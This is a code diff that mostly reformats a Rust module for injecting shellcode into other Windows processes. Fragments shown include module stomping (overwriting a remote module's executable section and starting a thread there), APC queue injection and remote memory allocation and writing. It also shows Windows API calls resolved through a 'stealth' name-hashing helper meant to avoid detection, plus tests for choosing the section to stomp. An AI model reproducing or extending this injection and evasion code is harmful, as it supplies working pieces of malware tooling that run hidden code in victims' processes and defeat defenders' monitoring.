@@ -63,7 +63,11 @@ pub fn normalize_inject_method(method: &str) -> &'static str {
     }
 }
 
-fn inject_shellcode_inner(pid: u32, shellcode: &[u8], method: &str) -> Result<InjectResult, String> {
+fn inject_shellcode_inner(
+    pid: u32,
+    shellcode: &[u8],
+    method: &str,
+) -> Result<InjectResult, String> {
     let h_proc = open_process(pid, PROCESS_INJECT_ACCESS)?;
     let cleanup_proc = |h: usize| {
         let _ = close_handle(h);
@@ -196,7 +200,11 @@ pub fn stomp_module_name_ok(name_utf16_or_ascii: &str) -> bool {
 /// Pick best stomping region from PE section table (first RX section large enough).
 pub fn pick_stomp_text_section(
     image_base: usize,
-    sections: &[(u32 /* rva */, u32 /* vsize */, u32 /* chars */)],
+    sections: &[(
+        u32, /* rva */
+        u32, /* vsize */
+        u32, /* chars */
+    )],
     shellcode_len: usize,
 ) -> Option<StompCandidate> {
     const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
@@ -218,11 +226,7 @@ pub fn pick_stomp_text_section(
 }
 
 /// Module stomping: write shellcode over a remote module RX section; start thread there.
-fn module_stomp_inject(
-    pid: u32,
-    h_proc: usize,
-    shellcode: &[u8],
-) -> Result<InjectResult, String> {
+fn module_stomp_inject(pid: u32, h_proc: usize, shellcode: &[u8]) -> Result<InjectResult, String> {
     let candidate = find_remote_stomp_candidate(pid, h_proc, shellcode.len())?;
     let remote = candidate
         .module_base
@@ -457,13 +461,8 @@ fn remote_alloc_write(h_proc: usize, data: &[u8]) -> Result<usize, String> {
         }
         type VirtualAllocExFn =
             unsafe extern "system" fn(usize, *mut u8, usize, u32, u32) -> *mut u8;
-        type WriteProcessMemoryFn = unsafe extern "system" fn(
-            usize,
-            *mut u8,
-            *const u8,
-            usize,
-            *mut usize,
-        ) -> i32;
+        type WriteProcessMemoryFn =
+            unsafe extern "system" fn(usize, *mut u8, *const u8, usize, *mut usize) -> i32;
 
         let va: VirtualAllocExFn = std::mem::transmute(
             stealth::get_api_addr(k32, stealth::hash_api_name(b"VirtualAllocEx"))
@@ -653,9 +652,7 @@ fn queue_user_apc_inject(pid: u32, _h_proc: usize, start: usize) -> Result<usize
 
 #[cfg(test)]
 mod inject_method_tests {
-    use super::{
-        normalize_inject_method, pick_stomp_text_section, stomp_module_name_ok,
-    };
+    use super::{normalize_inject_method, pick_stomp_text_section, stomp_module_name_ok};
 
     #[test]
     fn apc_and_stomping_methods_are_recognized() {
@@ -690,9 +687,9 @@ mod inject_method_tests {
     fn pick_stomp_text_prefers_executable_section() {
         // (rva, vsize, chars) — IMAGE_SCN_MEM_EXECUTE = 0x20000000
         let secs = [
-            (0x1000u32, 0x200u32, 0x4000_0000),       // rdata-like, not exec
-            (0x2000u32, 0x1000u32, 0x6000_0020),      // .text exec
-            (0x4000u32, 0x100u32, 0x2000_0000),       // small exec
+            (0x1000u32, 0x200u32, 0x4000_0000),  // rdata-like, not exec
+            (0x2000u32, 0x1000u32, 0x6000_0020), // .text exec
+            (0x4000u32, 0x100u32, 0x2000_0000),  // small exec
         ];
         let c = pick_stomp_text_section(0x7FF0_0000, &secs, 0x100).expect("text");
         assert_eq!(c.text_rva, 0x2000);
